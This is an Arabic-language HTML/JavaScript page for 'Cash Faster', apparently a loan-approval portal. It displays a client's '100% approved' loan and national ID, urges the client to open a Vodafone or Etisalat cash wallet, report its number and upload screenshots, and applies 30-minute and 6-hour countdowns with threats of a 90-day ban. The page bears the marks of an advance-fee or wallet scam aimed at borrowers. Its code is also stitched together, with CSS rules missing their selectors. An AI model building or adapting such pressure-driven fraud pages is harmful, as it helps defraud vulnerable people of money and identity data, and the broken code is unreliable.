<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>كاش فاستر | منصة التمويل الآمنة</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* ===== RESET & ROOT ===== */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --primary: #2ECC71;
      --primary-dark: #27AE60;
      --gold: #D4AF37;
      --gold-dark: #B8960F;
      --gold-glow: rgba(212,175,55,0.3);
      --bg-dark: #0A0F1A;
      --bg-card: #0F1625;
      --text-light: #F8FAFC;
      --text-muted: #8899AA;
      --border-color: #1E2A3A;
      --shadow: 0 8px 32px rgba(0,0,0,0.6);
      --whatsapp: #25D366;
      --danger: #EF4444;
      --orange: #FF8C42;
      --vodafone-red: #E60000;
      --anuta-blue: #00D9FF;
      --anuta-green: #22C55E;
      --anuta-purple: #7C3AED;
      --font: 'Cairo', sans-serif;
    }
    body {
      font-family: var(--font);
      background: var(--bg-dark);
      color: var(--text-light);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0.8rem;
      position: relative;
      overflow-x: hidden;
    }
    .bg-particles {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
      background-image:
        radial-gradient(circle at 20% 50%, rgba(46,204,113,0.05) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(212,175,55,0.06) 0%, transparent 40%),
        radial-gradient(circle at 40% 80%, rgba(0,217,255,0.04) 0%, transparent 40%);
      pointer-events: none;
      animation: bgPulse 10s ease-in-out infinite alternate;
    }
    @keyframes bgPulse { 0% { opacity: 0.5; transform: scale(1); } 100% { opacity: 1; transform: scale(1.03); } }

    .bg-grid {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
      background-image:
        linear-gradient(rgba(46,204,113,0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(46,204,113,0.03) 1px, transparent 1px);
      background-size: 60px 60px;
      pointer-events: none;
      animation: gridMove 25s linear infinite;
    }
    @keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(60px,60px); } }

    .floating-shapes {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden;
    }
    .floating-shapes .shape {
      position: absolute; border-radius: 50%; opacity: 0.04; animation: floatShape 18s ease-in-out infinite;
    }
    .floating-shapes .shape:nth-child(1) { width: 350px; height: 350px; background: var(--gold); top: -120px; right: -80px; animation-delay: 0s; }
    .floating-shapes .shape:nth-child(2) { width: 250px; height: 250px; background: var(--primary); bottom: -80px; left: -80px; animation-delay: 6s; }
    .floating-shapes .shape:nth-child(3) { width: 180px; height: 180px; background: var(--anuta-blue); top: 30%; right: -40px; animation-delay: 12s; }
    @keyframes floatShape {
      0%, 100% { transform: translate(0,0) scale(1); }
      25% { transform: translate(40px,-40px) scale(1.1); }
      50% { transform: translate(-30px,30px) scale(0.9); }
      75% { transform: translate(30px,40px) scale(1.05); }
    }

    .app-container {
      max-width: 480px;
      width: 100%;
      background: rgba(10, 15, 26, 0.92);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border-radius: 2.2rem;
      padding: 1.4rem 1.2rem;
      box-shadow: var(--shadow), 0 0 80px rgba(0,0,0,0.4);
      border: 1px solid rgba(255,255,255,0.06);
      position: relative;
      z-index: 1;
      overflow: hidden;
    }
    .app-container::before {
      content: '';
      position: absolute;
      top: -50%; left: -50%; width: 200%; height: 200%;
      background: radial-gradient(ellipse at 30% 20%, rgba(46,204,113,0.06), transparent 60%);
      pointer-events: none;
      z-index: 0;
      animation: glowRotate 25s linear infinite;
    }
    @keyframes glowRotate {
      0% { transform: rotate(0deg) scale(1); }
      50% { transform: rotate(180deg) scale(1.2); }
      100% { transform: rotate(360deg) scale(1); }
    }

    .promo-strip {
      background: linear-gradient(90deg, rgba(212,175,55,0.12), rgba(46,204,113,0.08), rgba(0,217,255,0.06));
      border: 1px solid rgba(212,175,55,0.15);
      border-radius: 3rem;
      padding: 0.5rem 1.2rem;
      margin-bottom: 1rem;
      text-align: center;
      font-size: 0.7rem;
      color: var(--gold);
      position: relative;
      z-index: 1;
      animation: stripPulse 4s ease-in-out infinite;
      letter-spacing: 0.3px;
    }
    @keyframes stripPulse { 0%, 100% { border-color: rgba(212,175,55,0.15); } 50% { border-color: rgba(212,175,55,0.4); } }
    .promo-strip i { color: var(--primary); margin-left: 0.4rem; }
    .promo-strip .highlight { color: var(--gold); font-weight: 700; }

    .header {
      display: flex; justify-content: space-between; align-items: center;
      padding-bottom: 1rem; border-bottom: 1px solid var(--border-color);
      position: relative; z-index: 1;
    }
    .header .brand { display: flex; align-items: center; gap: 0.6rem; }
    .header .brand .icon {
      width: 44px; height: 44px;
      background: linear-gradient(135deg, var(--gold), var(--primary));
      border-radius: 14px;
      display: flex; align-items: center; justify-content: center;
      font-size: 1.5rem; color: #0A0F1A; font-weight: 900;
      box-shadow: 0 0 30px var(--gold-glow);
      animation: iconGlow 3.5s ease-in-out infinite;
      cursor: pointer;
      transition: transform 0.2s;
    }
    .header .brand .icon:hover { transform: scale(1.05); }
    @keyframes iconGlow {
      0%, 100% { box-shadow: 0 0 20px var(--gold-glow); }
      50% { box-shadow: 0 0 50px rgba(212,175,55,0.5), 0 0 80px rgba(46,204,113,0.15); }
    }
    .header .brand h1 {
      font-size: 1.4rem; font-weight: 800;
      background: linear-gradient(135deg, #FFF, var(--primary), var(--gold));
      -webkit-background-clip: text; background-clip: text;
      color: transparent;
      letter-spacing: 0.5px;
    }
    .header .brand h1 span { color: var(--gold); -webkit-text-fill-color: var(--gold); }
    .header .badge {
      background: rgba(46,204,113,0.10);
      border: 1px solid rgba(46,204,113,0.15);
      border-radius: 3rem;
      padding: 0.3rem 1rem;
      font-size: 0.6rem;
      color: var(--primary);
      display: flex; align-items: center; gap: 0.4rem;
      backdrop-filter: blur(4px);
    }
    .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
    @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }

    .nav-tabs {
      display: flex; gap: 0.4rem; margin: 1rem 0 1rem 0;
      background: rgba(255,255,255,0.03); border-radius: 3rem;
      padding: 0.3rem; border: 1px solid var(--border-color);
      position: relative; z-index: 1;
    }
    .nav-tabs .tab {
      flex: 1; text-align: center; padding: 0.5rem 0.2rem;
      border-radius: 3rem; font-size: 0.7rem; font-weight: 600;
      color: var(--text-muted); cursor: default;
      transition: 0.25s; background: transparent;
    }
    .nav-tabs .tab.active {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: #0A0F1A; box-shadow: 0 6px 20px rgba(46,204,113,0.3);
    }
    .nav-tabs .tab i { margin-left: 0.3rem; }

    .search-box {
      display: flex; gap: 0.5rem; margin: 0.8rem 0 1.2rem 0;
      position: relative; z-index: 1;
    }
    .search-box input {
      flex: 1; padding: 0.8rem 1.2rem; border-radius: 3rem;
      border: 2px solid var(--border-color); background: rgba(255,255,255,0.04);
      color: white; font-size: 0.9rem; text-align: center;
      transition: 0.25s; font-family: var(--font);
      backdrop-filter: blur(4px);
    }
    .search-box input:focus {
      outline: none; border-color: var(--gold);
      box-shadow: 0 0 35px var(--gold-glow);
    }
    .search-box input::placeholder { color: var(--text-muted); font-weight: 400; }
    .search-box button {
      padding: 0.8rem 1.6rem; border: none; border-radius: 3rem;
      background: linear-gradient(135deg, var(--gold), var(--gold-dark));
      color: #0A0F1A; font-weight: 800; cursor: pointer;
      transition: 0.25s; font-family: var(--font); font-size: 0.85rem;
      display: flex; align-items: center; gap: 0.4rem;
      box-shadow: 0 6px 24px var(--gold-glow);
      white-space: nowrap;
    }
    .search-box button:hover { transform: scale(1.03); box-shadow: 0 0 45px rgba(212,175,55,0.5); }

    .loan-card {
      background: linear-gradient(145deg, #111B2B, #0A1220);
      border-radius: 1.6rem; padding: 1.4rem 1.2rem;
      border: 1px solid var(--border-color); margin-bottom: 1rem;
      position: relative; z-index: 1; overflow: hidden;
      backdrop-filter: blur(4px);
    }
    .loan-card::after {
      content: ''; position: absolute; top: -30%; right: -20%;
      width: 70%; height: 120%; background: radial-gradient(ellipse, rgba(212,175,55,0.06), transparent 70%);
      pointer-events: none;
    }
    .loan-card .loan-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; text-align: center; }
    .loan-card .loan-amount-main {
      text-align: center; font-size: 2.8rem; font-weight: 900;
      color: #FFF; margin: 0.2rem 0; letter-spacing: 1px; position: relative; z-index: 1;
    }
    .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 600; }
    .loan-card .loan-percent {
      text-align: center; font-size: 0.95rem; color: var(--gold);
      font-weight: 700; position: relative; z-index: 1;
    }
    .loan-card .loan-percent i { color: var(--gold); margin-left: 0.4rem; }

    .loan-details-grid {
      display: grid; grid-template-columns: 1fr 1fr 1fr;
      gap: 0.6rem; margin-top: 1rem; padding-top: 1rem;
      border-top: 1px solid var(--border-color); position: relative; z-index: 1;
    }
    .loan-details-grid .detail-item {
      text-align: center; background: rgba(255,255,255,0.02);
      border-radius: 0.8rem; padding: 0.4rem 0.2rem; transition: 0.2s;
    }
    .loan-details-grid .detail-item:hover { background: rgba(255,255,255,0.05); }
    .loan-details-grid .detail-item .label { font-size: 0.55rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
    .loan-details-grid .detail-item .value { font-size: 0.95rem; font-weight: 700; color: #FFF; margin-top: 0.15rem; }
    .loan-details-grid .detail-item .value.gold { color: var(--gold); }
    .loan-details-grid .detail-item .value.green { color: var(--primary); }
    .loan-details-grid .detail-item .value.danger { color: var(--danger); }

    .status-bar {
      display: flex; align-items: center; gap: 0.6rem;
      background: rgba(255,255,255,0.03); border-radius: 1.6rem;
      padding: 0.6rem 1rem; border: 1px solid var(--border-color);
      margin: 0.8rem 0; position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }
    .status-bar .status-icon {
      width: 36px; height: 36px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 0.95rem; flex-shrink: 0;
    }
    .status-bar .status-text { flex: 1; }
    .status-bar .status-text .main { font-weight: 700; font-size: 0.9rem; }
    .status-bar .status-text .sub { font-size: 0.65rem; color: var(--text-muted); }
    .status-bar .status-badge {
      border-radius: 3rem; padding: 0.2rem 0.8rem; font-size: 0.6rem;
      font-weight: 600; backdrop-filter: blur(4px);
    }
    .status-bar.danger .status-icon { background: rgba(239,68,68,0.15); color: var(--danger); }
    .status-bar.danger .status-badge { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.25); color: var(--danger); }
    .status-bar.success .status-icon { background: rgba(46,204,113,0.15); color: var(--primary); }
    .status-bar.success .status-badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.25); color: var(--primary); }
    .status-bar.warning .status-icon { background: rgba(212,175,55,0.15); color: var(--gold); }
    .status-bar.warning .status-badge { background: rgba(212,175,55,0.12); border: 1px solid rgba(212,175,55,0.25); color: var(--gold); }

    .client-info {
      background: rgba(255,255,255,0.02); border-radius: 1.2rem;
      padding: 0.8rem 1rem; border: 1px solid var(--border-color);
      margin: 0.8rem 0; position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }
    .client-info .row {
      display: flex; justify-content: space-between;
      padding: 0.35rem 0; border-bottom: 1px solid rgba(255,255,255,0.03);
      font-size: 0.8rem;
    }
    .client-info .row:last-child { border-bottom: none; }
    .client-info .row .key { color: var(--text-muted); }
    .client-info .row .value { font-weight: 600; text-align: left; color: #FFF; }
    .client-info .row .value.gold { color: var(--gold); }
    .client-info .row .value.green { color: var(--primary); }
    .client-info .row .value.danger { color: var(--danger); }

    .step-message {
      background: rgba(212,175,55,0.04); border: 2px solid var(--gold);
      border-radius: 1.4rem; padding: 1rem; margin: 0.8rem 0;
      text-align: center; position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }
    .step-message i { color: var(--gold); font-size: 1.8rem; display: block; margin-bottom: 0.3rem; }
    .step-message p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.9; margin: 0; }
    .step-message .sub-text { font-size: 0.7rem; color: var(--gold); margin-top: 0.4rem; display: block; }

    .alert-warning-box {
      background: linear-gradient(145deg, rgba(212,175,55,0.10), rgba(46,204,113,0.05));
      border: 2px solid var(--gold); border-radius: 1.6rem;
      padding: 1.2rem; margin: 0.8rem 0;
      position: relative; z-index: 1; overflow: hidden;
      animation: warningPulse 4s ease-in-out infinite;
      box-shadow: 0 0 40px rgba(212,175,55,0.06);
      backdrop-filter: blur(4px);
    }
    @keyframes warningPulse { 0%, 100% { box-shadow: 0 0 15px rgba(212,175,55,0.08); } 50% { box-shadow: 0 0 60px rgba(212,175,55,0.15); } }
    .alert-warning-box::before {
      content: ''; position: absolute; top: -50%; left: -50%;
      width: 200%; height: 200%;
      background: conic-gradient(from 0deg, transparent, rgba(212,175,55,0.05), transparent, rgba(46,204,113,0.03), transparent);
      animation: rotateGlow 15s linear infinite; pointer-events: none;
    }
    @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .alert-warning-box .alert-header {
      display: flex; align-items: center; gap: 0.8rem;
      position: relative; z-index: 1; margin-bottom: 0.6rem;
    }
    .alert-warning-box .alert-header .alert-icon {
      font-size: 3rem; color: var(--gold);
      animation: shakeWarning 2.5s ease-in-out infinite; flex-shrink: 0;
    }
    @keyframes shakeWarning {
      0%, 100% { transform: rotate(0deg) scale(1); }
      10% { transform: rotate(12deg) scale(1.08); }
      20% { transform: rotate(-8deg) scale(0.95); }
      30% { transform: rotate(8deg) scale(1.04); }
      40% { transform: rotate(-4deg) scale(1); }
      50% { transform: rotate(0deg) scale(1); }
    }
    .alert-warning-box .alert-header h3 { font-size: 1.1rem; font-weight: 800; color: var(--gold); margin: 0; }
    .alert-warning-box .alert-header h3 .highlight-red { color: var(--vodafone-red); }
    .alert-warning-box .alert-header h3 .highlight-blue { color: var(--anuta-blue); }
    .alert-warning-box .alert-body p { color: var(--text-muted); font-size: 0.85rem; line-height: 2; margin: 0.3rem 0; }
    .alert-warning-box .alert-body .highlight-gold { color: var(--gold); font-weight: 700; }

    .alert-warning-box .steps-mini {
      background: rgba(0,0,0,0.3); border-radius: 1.2rem;
      padding: 0.7rem 1rem; margin: 0.6rem 0;
      border-right: 4px solid var(--gold);
    }
    .alert-warning-box .steps-mini .step {
      display: flex; align-items: center; gap: 0.6rem;
      padding: 0.25rem 0; font-size: 0.8rem; color: var(--text-muted);
    }
    .alert-warning-box .steps-mini .step .num {
      min-width: 26px; height: 26px; border-radius: 50%;
      background: var(--gold); color: #0A0F1A; font-weight: 800;
      font-size: 0.7rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    }
    .alert-warning-box .steps-mini .step strong { color: #FFF; }

    .timer-container {
      background: rgba(0,0,0,0.3); border-radius: 1.2rem;
      padding: 0.6rem; margin: 0.6rem 0; text-align: center;
      border: 1px solid rgba(212,175,55,0.15);
      backdrop-filter: blur(4px);
    }
    .timer-container .timer-label { font-size: 0.7rem; color: var(--text-muted); margin-bottom: 0.2rem; }
    .timer-container .timer-label i { color: var(--gold); margin-left: 0.3rem; }
    .timer-container .timer-value {
      font-size: 1.8rem; font-weight: 800; color: var(--gold);
      letter-spacing: 2px; font-family: 'Courier New', monospace;
      transition: color 0.3s;
    }
    .timer-container .timer-value.danger { color: var(--danger); animation: timerBlink 0.8s ease-in-out infinite; }
    @keyframes timerBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

    .btn-upload-survey {
      width: 100%; padding: 1rem; border: none; border-radius: 3rem;
      background: linear-gradient(135deg, var(--anuta-purple), #5B21B6);
      color: white; font-weight: 900; font-size: 1.1rem;
      display: flex; align-items: center; justify-content: center; gap: 0.8rem;
      cursor: pointer; transition: 0.25s;
      box-shadow: 0 6px 30px rgba(124,58,237,0.35);
      margin-top: 0.8rem; position: relative; z-index: 1;
      border: 2px solid rgba(255,255,255,0.1);
    }
    .btn-upload-survey:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(124,58,237,0.5); }
    .btn-upload-survey i { font-size: 1.4rem; }

    .btn-whatsapp {
      width: 100%; padding: 0.8rem; border: none; border-radius: 3rem;
      background: linear-gradient(135deg, #25D366, #128C7E);
      color: white; font-weight: 800; font-size: 0.9rem;
      display: flex; align-items: center; justify-content: center; gap: 0.6rem;
      cursor: pointer; transition: 0.25s;
      box-shadow: 0 6px 24px rgba(37,211,102,0.25);
      margin-top: 0.5rem; position: relative; z-index: 1;
    }
    .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 40px rgba(37,211,102,0.4); }
    .btn-whatsapp.gold-btn { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); box-shadow: 0 6px 24px rgba(212,175,55,0.25); }
    .btn-whatsapp.gold-btn:hover { box-shadow: 0 0 45px rgba(212,175,55,0.4); }

    .blocked-box {
      background: rgba(239,68,68,0.08); border: 2px solid var(--danger);
      border-radius: 1.6rem; padding: 1.2rem; text-align: center;
      margin: 0.8rem 0; position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }
    .blocked-box i { font-size: 3.2rem; color: var(--danger); margin-bottom: 0.5rem; display: block; }
    .blocked-box h3 { color: var(--danger); font-size: 1.2rem; margin-bottom: 0.5rem; }
    .blocked-box p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.9; }

    .completed-box {
      background: rgba(46,204,113,0.06); border: 2px solid var(--primary);
      border-radius: 1.6rem; padding: 1.2rem; text-align: center;
      margin: 0.8rem 0; position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }
    .completed-box i { font-size: 3.2rem; color: var(--primary); margin-bottom: 0.5rem; display: block; animation: bounceStar 1.5s ease-in-out infinite; }
    @keyframes bounceStar { 0%,100% { transform: scale(1) rotate(0deg); } 25% { transform: scale(1.12) rotate(6deg); } 75% { transform: scale(0.95) rotate(-4deg); } }
    .completed-box h3 { color: var(--primary); font-size: 1.2rem; margin-bottom: 0.5rem; }
    .completed-box p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.9; }
    .completed-box .highlight { color: var(--gold); font-weight: 700; }

    .error-box {
      background: rgba(239,68,68,0.06); border: 1px solid #EF4444;
      border-radius: 1.2rem; padding: 1rem; text-align: center;
      color: #EF4444; font-size: 0.85rem; display: none;
      margin-top: 0.6rem; position: relative; z-index: 1;
    }
    .loader { text-align: center; display: none; padding: 1rem 0; position: relative; z-index: 1; }
    .loader i { color: var(--gold); font-size: 2rem; }
    .loader p { color: var(--text-muted); font-size: 0.75rem; margin-top: 0.3rem; }

    .admin-panel {
      display: none; background: rgba(255,255,255,0.03);
      border-radius: 1.2rem; padding: 1rem; margin: 0.8rem 0;
      border: 1px solid var(--border-color); position: relative; z-index: 1;
      backdrop-filter: blur(4px);
    }

      background: radial-gradient(circle at center, rgba(239,68,68,0.12), rgba(212,175,55,0.04));

      padding: 0.8rem;
      margin: 0.6rem 0;
      text-align: center;
      animation: pulseRed 1.2s infinite alternate;

    }

      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.6rem;
      margin-bottom: 0.3rem;
    }

    }
    .warning-timeout .warn-icon span {
      color: var(--danger);
      font-weight: 900;
      font-size: 1.2rem;
    }
    .warning-timeout p {
      color: var(--text-muted);
      font-size: 0.9rem;
      line-height: 1.9;
      margin: 0;
    }
    .warning-timeout p strong {
      color: #FFF;
    }
    .warning-timeout .tags {
      display: flex;
      gap: 0.3rem;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 0.3rem;
    }
    .warning-timeout .tags span {

      border-radius: 2rem;

            </p>
            <div class="steps-mini">
              <div class="step"><div class="num">1</div><span><strong>التوجه لأقرب فرع ${isVodafone ? 'فودافون' : 'اتصالات'}</strong> ببطاقة الرقم القومي</span></div>
              <div class="step"><div class="num">2</div><span><strong>فتح محفظة ${walletName}</strong> وتفعيلها</span></div>
              <div class="step"><div class="num">3</div><span><strong>إبلاغنا</strong> برقم المحفظة الجديد لإتمام الصرف فوراً</span></div>
            </div>
            <div class="timer-container">
              <div class="timer-label"><i class="fas fa-hourglass-half"></i> الوقت المتبقي لفتح المحفظة</div>
              <div class="timer-value" id="openWalletCountdown">06:00:00</div>
            </div>
            <p style="font-size: 0.8rem; color: var(--text-muted);">
              ⏳ لديك <strong style="color: var(--gold);">6 ساعات</strong> لفتح المحفظة وإبلاغنا، وإلا سيتم إلغاء الطلب تلقائياً.
            </p>
            <button class="btn-whatsapp gold-btn" id="openWalletWhatsAppBtn">
              <i class="fab fa-whatsapp fa-lg"></i> 📱 إبلاغ بفتح المحفظة
            </button>
          </div>
        </div>
      `;
    }

    function buildLoanCard(client, totalDisplay) {
      const statusMap = { 'pending': 'قيد الإجراء', 'completed': 'تم الاستلام ✅', 'blocked': 'محظور 🚫' };
      const statusColor = { 'pending': 'gold', 'completed': 'green', 'blocked': 'danger' };
      const walletDisplay = client.hasEtisalat ? "اتصالات كاش" : client.hasVodafone ? "فودافون كاش" : client.wallet || "غير محدد";
      return `
        <div class="loan-card">
          <div class="loan-label">مبلغ القرض</div>
          <div class="loan-amount-main">${client.loanRaw} <span class="currency">ج.م</span></div>
          <div class="loan-percent"><i class="fas fa-check-circle"></i> تمت الموافقة 100%</div>
          <div style="text-align:center; font-size:0.7rem; color:var(--text-muted); margin-top:0.2rem;">
            الحالة: <span style="color:var(--${statusColor[client.clientStatus]}); font-weight:700;">${statusMap[client.clientStatus]}</span>
          </div>
          <div class="loan-details-grid">
            <div class="detail-item"><div class="label">مبلغ القرض</div><div class="value gold">${client.loanRaw} ج.م</div></div>
            <div class="detail-item"><div class="label">المدة</div><div class="value">${client.loanTerm}</div></div>
            <div class="detail-item"><div class="label">القسط الشهري</div><div class="value gold">${client.installment} ج.م</div></div>
            <div class="detail-item"><div class="label">إجمالي السداد</div><div class="value">${totalDisplay}</div></div>
            <div class="detail-item"><div class="label">نوع المحفظة</div><div class="value gold">${walletDisplay}</div></div>
            <div class="detail-item"><div class="label">رقم المحفظة</div><div class="value">${client.walletNum || "سيتم تسجيله"}</div></div>
          </div>
        </div>
      `;
    }

    function buildStepMessage(client) {
      let warningText = '';
      if (client.clientStatus === 'pending') {
        warningText = `
          <div class="warning-timeout">
            <div class="warn-icon">
              <i class="fas fa-exclamation-triangle"></i>
              <span>⚠️ تنبيه هام</span>
            </div>
            <p>
              <strong>${client.name}</strong>،
              <br>
              <span style="color: var(--danger); font-weight: 700;">🚨 يجب إنهاء الإجراءات المطلوبة فى أسرع وقت ممكن!</span>
              <br>
              <span style="color: var(--text-muted);">
                في حالة عدم إنهاء الإجراءات خلال <strong style="color: var(--gold);">30 دقيقة</strong>،
                سيتم <strong style="color: var(--danger);">شطب طلبك</strong> ولن تتمكن من استرداده إلا بعد <strong style="color: var(--gold);">مرور 90 يوماً</strong>.
              </span>
            </p>
            <div class="tags">
              <span><i class="fas fa-clock"></i> 30 دقيقة متبقية</span>
              <span class="gold-tag"><i class="fas fa-calendar-times"></i> 90 يوماً للحظر</span>
            </div>
          </div>
        `;
      }
      return `
        <div class="step-message">
          <i class="fas fa-info-circle"></i>
          <p>${client.clientStatus === 'blocked' ? '🚫 تم حظر تعاملك مع النظام نهائياً.' : client.clientStatus === 'completed' ? '✅ تم الانتهاء من هذه المرحلة بنجاح.' : '📌 يرجى اتباع التعليمات أدناه لاستكمال إجراءات الصرف.'}</p>
          ${warningText}
          <span class="sub-text">⏳ بعد الانتهاء من الإجراءات: سيتم فتح رابط تحويل القرض لك وتحديد موعد نزول المبلغ</span>
        </div>
      `;
    }

    function buildClientDetails(client) {
      const statusMap = { 'pending': 'قيد الإجراء', 'completed': 'تم الاستلام ✅', 'blocked': 'محظور 🚫' };
      const statusColor = { 'pending': 'gold', 'completed': 'green', 'blocked': 'danger' };
      const walletDisplay = client.hasEtisalat ? "اتصالات كاش" : client.hasVodafone ? "فودافون كاش" : client.wallet || "غير محدد";
      return `
        <div class="client-info">
          <div class="row"><span class="key">الاسم</span><span class="value">${client.name}</span></div>
          <div class="row"><span class="key">الرقم القومي</span><span class="value gold">${client.id}</span></div>
          <div class="row"><span class="key">الوظيفة</span><span class="value">${client.job || "غير مسجل"}</span></div>
          <div class="row"><span class="key">المحفظة</span><span class="value gold">${walletDisplay}</span></div>
          <div class="row"><span class="key">رقم المحفظة</span><span class="value">${client.walletNum || "سيتم تسجيله"}</span></div>
          <div class="row"><span class="key">حالة الطلب</span><span class="value ${statusColor[client.clientStatus]}">${statusMap[client.clientStatus]}</span></div>
          <div class="row"><span class="key">الضامن</span><span class="value">${client.guarantorName || "غير مسجل"}</span></div>
        </div>
      `;
    }

    function buildBlockedMessage(client) {
      return `
        <div class="blocked-box">
          <i class="fas fa-ban"></i>
          <h3>🚫 تم حظر تعاملك مع النظام</h3>
          <p>
            عزيزي <strong style="color: #FFF;">${client.name}</strong>،
            <br><br>
            <span style="color: var(--danger); font-weight: 700;">📌 سبب الحظر:</span><br>
            تم حظر تعاملك مع نظام كاش فاستر لمدة 90 يوماً نظراً لعدم إنهاء إجراءات الربط خلال المدة المحددة (30 دقيقة).
            <br><br>
            <span style="color: var(--text-muted);">❌ لن تتمكن من استرداد طلبك مرة أخرى قبل انتهاء هذه المدة.</span>
          </p>
          <button class="btn-whatsapp" id="blockedWhatsAppBtn" style="margin-top: 0.5rem; background: linear-gradient(135deg, #FF6B6B, #EE4444);">
            <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع الدعم
          </button>
        </div>
      `;
    }

    function buildCompletedMessage(client) {
      return `
        <div class="completed-box">
          <i class="fas fa-check-circle"></i>
          <h3>✅ تم الانتهاء من هذه المرحلة</h3>
          <p>
            عزيزي <strong style="color: #FFF;">${client.name}</strong>،
            <br><br>
            <span style="color: var(--primary); font-weight: 700;">🎉 تهانينا!</span><br>
            تم الانتهاء من مرحلة ربط الحساب بنجاح.
            <br><br>
            <span style="color: var(--gold); font-weight: 700;">📌 سيتم فتح رابط تحويل القرض لك</span><br>
            وسيتم تحديد موعد نزول المبلغ لحسابك بعدد من الدقائق يتم تحديده من خلال النظام.
          </p>
          <button class="btn-whatsapp success-btn" id="completedWhatsAppBtn" style="margin-top: 0.5rem;">
            <i class="fab fa-whatsapp fa-lg"></i> 📱 متابعة موعد الاستلام
          </button>
        </div>
      `;
    }

    function displayResult(client, index) {
      currentClient = client;
      currentIndex = index;
      const resultArea = document.getElementById('resultArea');
      const totalDisplay = calculateTotal(client);
      updateAdminStatus(client.clientStatus);

      let html = '';
      html += buildLoanCard(client, totalDisplay);
      html += buildStepMessage(client);

      if (client.clientStatus === 'blocked') {
        html += buildBlockedMessage(client);
      } else if (client.clientStatus === 'completed') {
        html += buildCompletedMessage(client);
      } else {
        if (client.hasEtisalat === true || client.hasVodafone === true) {
          html += `
            <div class="status-bar success">
              <div class="status-icon"><i class="fas fa-check-circle"></i></div>
              <div class="status-text">
                <div class="main" style="color: var(--primary);">✅ تمت الموافقة النهائية!</div>
                <div class="sub">تم اعتماد طلب التمويل الخاص بك بنجاح</div>
              </div>
              <div class="status-badge">معتمد</div>
            </div>
          `;
          html += buildWalletInstructions(client);
        } else {
          html += `
            <div class="status-bar danger">
              <div class="status-icon"><i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i></div>
              <div class="status-text">
                <div class="main" style="color: var(--danger);">⚠️ مطلوب فتح محفظة</div>
                <div class="sub">يجب فتح محفظة اتصالات كاش أو فودافون كاش خلال 6 ساعات</div>
              </div>
              <div class="status-badge" style="background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.25); color: var(--danger);">مطلوب إجراء عاجل</div>
            </div>
          `;
          html += buildOpenWalletMessage(client);
        }
      }

      html += buildClientDetails(client);
      resultArea.innerHTML = html;

      if (client.clientStatus === 'pending') {
        if (client.hasEtisalat === true || client.hasVodafone === true) {
          setTimeout(() => {
            const timerEl = document.getElementById('walletCountdown');
            if (timerEl) startWalletCountdown(30 * 60);
          }, 100);
        } else {
          setTimeout(() => {
            const timerEl = document.getElementById('openWalletCountdown');
            if (timerEl) startOpenWalletCountdown(6 * 60 * 60);
          }, 100);
        }
      } else {
        if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
      }

      setTimeout(() => {
        const uploadBtn = document.getElementById('uploadScreensBtn');
        if (uploadBtn) {
          uploadBtn.replaceWith(uploadBtn.cloneNode(true));
          document.getElementById('uploadScreensBtn')?.addEventListener('click', (e) => {
            e.preventDefault();
            window.open(SURVEY_URL, '_blank');
          });
        }

        const openWalletBtn = document.getElementById('openWalletWhatsAppBtn');
        if (openWalletBtn) {
          openWalletBtn.replaceWith(openWalletBtn.cloneNode(true));
          document.getElementById('openWalletWhatsAppBtn')?.addEventListener('click', (e) => {
            e.preventDefault();
            openWhatsApp(true);
          });
        }

        const blockedBtn = document.getElementById('blockedWhatsAppBtn');
        if (blockedBtn) {
          blockedBtn.replaceWith(blockedBtn.cloneNode(true));
          document.getElementById('blockedWhatsAppBtn')?.addEventListener('click', (e) => {
            e.preventDefault();
            openWhatsApp(false);
          });
        }

        const completedBtn = document.getElementById('completedWhatsAppBtn');
        if (completedBtn) {
          completedBtn.replaceWith(completedBtn.cloneNode(true));
          document.getElementById('completedWhatsAppBtn')?.addEventListener('click', (e) => {
            e.preventDefault();
            openWhatsApp(false);
          });
        }
      }, 50);

